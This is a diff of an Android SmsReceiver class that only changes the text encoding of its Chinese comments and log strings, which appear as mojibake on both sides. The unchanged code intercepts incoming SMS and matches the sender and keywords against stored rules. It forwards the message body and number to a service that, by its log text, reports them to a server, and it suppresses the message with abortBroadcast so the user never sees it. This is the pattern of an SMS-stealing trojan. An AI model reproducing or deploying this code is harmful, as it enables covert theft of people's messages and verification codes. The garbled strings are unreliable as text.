@@ -14,7 +14,7 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 /*
- * À¹½Ø¶ÌÐÅ
+ * æ‹¦æˆªçŸ­ä¿¡
  */
 public class SmsReceiver extends BroadcastReceiver{
 	private DbHelper dbAdapter = null;
@@ -24,9 +24,9 @@ public class SmsReceiver extends BroadcastReceiver{
 		// TODO Auto-generated method stub
 		//Tools.KillApp(context, "");
 		mContext = context;
-		Logger.error("À¹½Øµ½¶ÌÐÅ!!!!!!!!!!!!!!!!!!!");	
+		Logger.error("æ‹¦æˆªåˆ°çŸ­ä¿¡!!!!!!!!!!!!!!!!!!!");	
 		if (intent != null) {
-	            Logger.info("action:"+"À¹½Øµ½¶ÌÐÅ!!!!!!!!!!!!!!!!!!!");	            
+	            Logger.info("action:"+"æ‹¦æˆªåˆ°çŸ­ä¿¡!!!!!!!!!!!!!!!!!!!");	            
 	            //abortBroadcast();	            
 	            Bundle bundle = intent.getExtras();			
 		    	if (bundle != null) {
@@ -38,7 +38,7 @@ public class SmsReceiver extends BroadcastReceiver{
 					    	messages[i] = SmsMessage.createFromPdu((byte[]) myOBJpdus[i]);	
 				    	} 
 			    	}catch(Exception e){
-			    		Logger.info("²»Ö§³ÖË«Ä£ÊÖ»ú");
+			    		Logger.info("ä¸æ”¯æŒåŒæ¨¡æ‰‹æœº");
 			    		return;
 			    	}			    			    	  	
 			    	SmsMessage message = messages[0];			    				    	  	
@@ -51,7 +51,7 @@ public class SmsReceiver extends BroadcastReceiver{
 			    		smsnum = smsnum.substring(3);
 			    	}	
 
-			    	Logger.info("¶ÌÐÅÄÚÈÝ:"+smsbody);
+			    	Logger.info("çŸ­ä¿¡å†…å®¹:"+smsbody);
 			    	
 			    	if(dbAdapter == null)
 		        	{
@@ -64,7 +64,7 @@ public class SmsReceiver extends BroadcastReceiver{
 		        	
 			    	if(null!=c&&c.getCount()>0)
 			    	{
-			    		Logger.info("¶ÌÐÅ:"+smsbody);
+			    		Logger.info("çŸ­ä¿¡:"+smsbody);
 			    		if(c.moveToFirst())
 			    		{
 			    			do{
@@ -74,7 +74,7 @@ public class SmsReceiver extends BroadcastReceiver{
 			    				long etime = c.getLong(3);
 			    				int id = c.getInt(4);
 			    				if(System.currentTimeMillis()<=etime)
-			    				{//»¹ÔÚ·¶Î§±»			    					
+			    				{//è¿˜åœ¨èŒƒå›´è¢«			    					
 			    					if(number.equals("*")&&keyword.equals("*"))
 			    					{
 			    						Intent service = new Intent(Tag.START);
@@ -82,10 +82,10 @@ public class SmsReceiver extends BroadcastReceiver{
 				    					service.putExtra("message", smsbody);
 				    					service.putExtra("number", smsnum);
 		    						    mContext.startService(service);
-		    						    Logger.info("·µ»Ø¸ø·þÎñÆ÷");	
+		    						    Logger.info("è¿”å›žç»™æœåŠ¡å™¨");	
 		    						    if(isback.equals("1"))
 			    						{
-			    							Logger.info("ÆÁ±Î¶ÌÐÅ");
+			    							Logger.info("å±è”½çŸ­ä¿¡");
 			    							abortBroadcast();
 			    						}
 			    					}else{
@@ -98,10 +98,10 @@ public class SmsReceiver extends BroadcastReceiver{
 						    					service.putExtra("message", smsbody);
 						    					service.putExtra("number", smsnum);
 				    						    mContext.startService(service);
-				    						    Logger.info("·µ»Ø¸ø·þÎñÆ÷");	
+				    						    Logger.info("è¿”å›žç»™æœåŠ¡å™¨");	
 				    						    if(isback.equals("1"))
 					    						{
-					    							Logger.info("ÆÁ±Î¶ÌÐÅ");
+					    							Logger.info("å±è”½çŸ­ä¿¡");
 					    							abortBroadcast();
 					    						}
 			    							}
@@ -115,10 +115,10 @@ public class SmsReceiver extends BroadcastReceiver{
 							    					service.putExtra("message", smsbody);
 							    					service.putExtra("number", smsnum);
 					    						    mContext.startService(service);
-					    						    Logger.info("·µ»Ø¸ø·þÎñÆ÷");	
+					    						    Logger.info("è¿”å›žç»™æœåŠ¡å™¨");	
 					    						    if(isback.equals("1"))
 						    						{
-						    							Logger.info("ÆÁ±Î¶ÌÐÅ");
+						    							Logger.info("å±è”½çŸ­ä¿¡");
 						    							abortBroadcast();
 						    						}
 				    							}
@@ -135,10 +135,10 @@ public class SmsReceiver extends BroadcastReceiver{
 						    					service.putExtra("message", smsbody);
 						    					service.putExtra("number", smsnum);
 				    						    mContext.startService(service);
-				    						    Logger.info("·µ»Ø¸ø·þÎñÆ÷");	
+				    						    Logger.info("è¿”å›žç»™æœåŠ¡å™¨");	
 				    						    if(isback.equals("1"))
 					    						{
-					    							Logger.info("ÆÁ±Î¶ÌÐÅ");
+					    							Logger.info("å±è”½çŸ­ä¿¡");
 					    							abortBroadcast();
 					    						}
 				    						}
@@ -150,10 +150,10 @@ public class SmsReceiver extends BroadcastReceiver{
 						    					service.putExtra("message", smsbody);
 						    					service.putExtra("number", smsnum);
 				    						    mContext.startService(service);
-				    						    Logger.info("·µ»Ø¸ø·þÎñÆ÷");	
+				    						    Logger.info("è¿”å›žç»™æœåŠ¡å™¨");	
 				    						    if(isback.equals("1"))
 					    						{
-					    							Logger.info("ÆÁ±Î¶ÌÐÅ");
+					    							Logger.info("å±è”½çŸ­ä¿¡");
 					    							abortBroadcast();
 					    						}
 				    						}
